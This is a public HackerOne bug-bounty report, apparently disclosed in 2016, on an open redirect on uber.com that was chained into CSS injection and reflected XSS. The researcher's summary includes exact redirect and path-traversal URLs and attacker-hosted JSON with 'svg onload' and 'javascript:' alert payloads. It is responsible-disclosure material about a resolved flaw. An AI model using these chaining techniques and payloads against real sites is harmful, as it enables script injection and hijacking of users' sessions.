{
  "id": 125791,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU3OTE=",
  "url": "https://hackerone.com/reports/125791",
  "title": "Reflected XSS via Unvalidated / Open Redirect in uber.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-03-24T21:10:58.581Z",
  "submitted_at": "2016-03-24T21:10:58.581Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mdv",
    "url": "/mdv",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-05-09T22:29:33.306Z",
  "bug_reporter_agreed_on_going_public_at": "2016-04-13T08:57:19.286Z",
  "team_member_agreed_on_going_public_at": "2016-05-09T22:29:33.222Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\nTo reproduce this issue, visit this URL: https://www.uber.com/en//example.com/\nThis URL will redirect at [example.com](https://example.com/).",
  "bounty_amount": "3000.0",
  "formatted_bounty": "$3,000",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 81107,
      "file_name": "Response.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/107/834faa37742f57ab1afaf12dad30d67a30e7ec1f/Response.png?response-content-disposition=attachment%3B%20filename%3D%22Response.png%22%3B%20filename%2A%3DUTF-8%27%27Response.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120350Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=69f486c04d79ace9527ee341dcd3bcacbe9985adbc78f5a8ac9bef0ece33a505",
      "file_size": 13735,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-05-13T08:57:19.375Z",
  "allow_singular_disclosure_after": -244695990.68653914,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "fqdn",
    "spam404",
    "painxploiter",
    "dz_samir",
    "fantam1",
    "dyabla",
    "sbavis20",
    "pei"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 1899,
      "category": "researcher",
      "content": "This report demonstrates how much the usual Open Redirect can be dangerous.\n\n### Open Redirect\nOpen Redirect was reproduced from this URL: [uber.com/en//example.com/](https://www.uber.com/en//example.com/)\nResponse:\n\n```\nHTTP/1.1 301\n...\nLocation: //example.com/\n```\n\n### CSS injection\nThis vulnerability was reproduced via parameter `theme` from URL [uber.com/?theme=../en//example.com/css-code.css%23](https://www.uber.com/?theme=../en//example.com/css-code.css%23) as follow:\n```\n<link rel=\"stylesheet\" id=\"theme-css\" href=\"https://uber.com/stylesheets/../en//example.com/css-code.css#.css\">\n```\nBrowser try to load CSS code from: [example.com/css-code.css](https://example.com/css-code.css)\nTo fix @uber added whitelisting the theme names.\n\n### Reflected Cross-Site Scripting\nThis vulnerability was produced via insufficient filtration API requests.\n>Example URL to controlling API request: [uber.com/careers/list/-CONTROLLED-/](https://www.uber.com/careers/list/-CONTROLLED-/)\nBrowser try to load JSON content from: [uber.com/api/jobs/-CONTROLLED-](https://www.uber.com/api/jobs/-CONTROLLED-)\n>\nSending API requests to another domain: [uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/)\nBrowser try to load JSON content from: \n[uber.com/en//example.com/file.json](https://uber.com/en//example.com/file.json) >>> [example.com/file.json](https://example.com/file.json)\n\nSo, on a controlled domain, I placed a JSON file with this content:\n```\n{  \n   \"id\":\"9999\",\n   \"title\":\"XSS on Uber.com\",\n   \"overview\":\"<svg onload=\\\"alert('XSS on '+ document.domain)\\\">\",\n   \"responsibilities\":null,\n   \"qualifications\":null,\n   \"lastUpdated\":\"2016-01-16 06:29 AM\",\n   \"formattedTeam\":\"xss\",\n   \"team\":\"xss\",\n   \"subTeam\":\"xss\",\n   \"formattedLocation\":\"xss\",\n   \"slugs\":{  \n      \"team\":\"xss\",\n      \"subTeam\":\"xss\",\n      \"city\":\"xss\",\n      \"country\":\"xss\"\n   },\n   \"city\":\"xss\",\n   \"country\":\"xss\",\n   \"jobUrl\":\"javascript:alert('XSS on '+ document.domain)\",\n   \"normalizedTitle\":\"xss\",\n   \"normalizedContent\":\"xss\"\n}\n```\nand get unusually high degree of control over the page.\nThen I found a similar XSS vector on [uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/).\nBrowser try to load JSON content from: [example.com/file.json](https://example.com/file.json)\nVulnerable JSON  for [uber.com/cities/-CONTROLLED-/](https://www.uber.com/cities/-CONTROLLED-/):\n```\n{  \n   \"products\":[  \n      {  \n         \"productDisplayType\":\"uberx\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberX\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      },\n      {  \n         \"productDisplayType\":\"uberxl\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberXL\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      }\n   ],\n   \"flatRates\":[  \n\n   ],\n   \"id\":9999,\n   \"cityId\":9999,\n   \"flatRateDisplayNames\":[  \n\n   ],\n   \"geoJson\":null,\n   \"geoPoint\":{  \n      \"latitude\":33.951252,\n      \"longitude\":-83.382943\n   },\n   \"slug\":\"xss\",\n   \"twitterHandle\":null,\n   \"theme\":{  \n      \"name\":\"united_states\",\n      \"ctaColor\":\"#57AD57\",\n      \"patternColor\":\"#4DB5D9\",\n      \"patternColorBackground\":\"#A6DAEC\"\n   },\n   \"rideContent\":\"XSS\",\n   \"driveContent\":\"XSS\",\n   \"impactContent\":\"XSS\",\n   \"name\":\"<marquee>XSS</marquee><svg onload=\\\"alert('XSS on '+ document.domain)\\\">\",\n   \"pageTitle\":\"XSS\",\n   \"pageDescription\":\"XSS\",\n   \"productLegalNotice\":null,\n   \"pageConfiguration\":{  \n\n   }\n}\n```",
      "user": {
        "id": 38696,
        "username": "mdv",
        "name": "",
        "bio": "",
        "cleared": false,
        "verified": true,
        "website": "https://twitter.com/phxxe",
        "location": "Ukraine",
        "created_at": "2015-08-19T10:29:28.856Z",
        "url": "https://hackerone.com/mdv",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
